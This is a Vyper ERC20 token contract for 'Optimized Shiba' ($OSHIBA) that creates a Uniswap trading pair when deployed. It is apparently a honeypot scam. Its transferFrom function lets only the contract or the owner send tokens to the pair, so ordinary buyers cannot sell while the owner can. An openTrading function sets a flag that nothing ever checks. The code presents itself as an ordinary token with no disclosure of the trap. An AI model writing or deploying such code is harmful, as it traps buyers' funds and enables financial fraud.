# License: MIT
#
#
#⠀⠀⢀⡶⠛⠛⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡶⠛⠛⣦⡀⠀⠀
#⠀⠀⣸⠃⠀⠀⠀⠙⢷⣴⣶⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⡾⠋⠀⠀⠀⢸⡇⠀⠀
#⠀⠀⣿⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠈⣇⠀⠀
#⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⢠⡇⠀⠀
#⠀⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀
#⠀⣼⣿⣿⡀⠀⠀⠀⢀⣠⣀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣄⡀⠀⠀⠀⢠⣿⣿⣧⠀
#⢸⣿⣿⣿⠃⠀⠀⠀⠘⠿⠿⠂⠀⠀⠀⠀⠀⠀⠸⠿⠿⠃⠀⠀⠀⠹⣿⣿⣿⡆
#⣿⣿⣿⡏⠀⠀⠀⠀⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⣀⣴⣾⡿⠀⠀⠀⠀⢻⣿⣿⣇
#⣿⣿⣿⠀⠀⠀⠀⠀⠈⠉⠛⠛⠂⡀⠤⠤⢄⠘⠛⠋⠉⠀⠀⠀⠀⠀⠘⣿⣿⣿
#⢿⣿⣿⠀⠀⢀⣀⠀⠀⠀⠀⡐⠁⢀⣀⣀⡀⠑⢄⠀⠀⠀⠀⣀⠀⠀⠠⣿⣿⡏
#⠸⣿⣿⡄⠀⠀⠀⠈⠐⢄⡜⠀⠀⢿⣿⣿⡇⠀⠀⢢⠄⠊⠁⠀⠀⠀⢸⣿⣿⠃
#⠀⢻⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠏⠀
#⠀⠀⠻⣿⣿⣷⣄⡀⠀⠀⠀⠀⢻⠉⠻⠋⠉⠏⠀⠀⠀⠀⢀⣤⣾⣿⣿⠏⠀⠀
#⠀⠀⠀⠙⢿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⡿⠁⠀⠀⠀
#⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⢿⣿⣿⣿⣿⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
#

interface Router:
    def factory() -> address: nonpayable
    def WETH() -> address: nonpayable

interface Factory:
    def createPair(tokenA: address , tokenB: address) -> address: nonpayable


from vyper.interfaces import ERC20
implements: ERC20

balanceOf: public(HashMap[address, uint256])
allowances: HashMap[address, HashMap[address, uint256]]

router: Router
pair: public(address)

name: public(String[64])
symbol: public(String[32])
owner: public(address)

decimals: public(uint256)
totalSupply: public(uint256)
trading: bool

@external
def __init__():
    self.name = "Optimized Shiba"
    self.symbol = "$OSHIBA"
    self.decimals = 18
    self.owner = msg.sender

    self.router = Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
    self.pair = Factory(self.router.factory()).createPair(
            self.router.WETH(),
            self
        )
    
    self.totalSupply = 1000000000 * 10 ** self.decimals

    self.balanceOf[msg.sender] = self.totalSupply
    log Transfer(ZERO_ADDRESS, self.owner, self.totalSupply)

event Transfer:
    sender: indexed(address)
    receiver: indexed(address)
    value: uint256

event Approval:
    owner: indexed(address)
    spender: indexed(address)
    value: uint256

@external
def transfer(_to: address, _value: uint256) -> bool:
    self.balanceOf[msg.sender] -= _value
    self.balanceOf[_to] += _value
    log Transfer(msg.sender, _to, _value)
    return True

@external
def transferFrom(_from: address, _to: address, _value: uint256) -> bool:
    if _to == self.pair:
        assert (_from == self) or (_from == self.owner)
    
    self.allowances[_from][msg.sender] -= _value
    self.balanceOf[_from] -= _value
    self.balanceOf[_to] += _value
    log Transfer(_from, _to, _value)
    return True

@view
@external
def allowance(_owner: address, _spender: address) -> uint256:
    return self.allowances[_owner][_spender]

@external
def approve(_spender: address, _value: uint256) -> bool:
    self.allowances[msg.sender][_spender] = _value
    log Approval(msg.sender, _spender, _value)
    return True

@external
def openTrading() -> bool:
    self.trading = True
    return True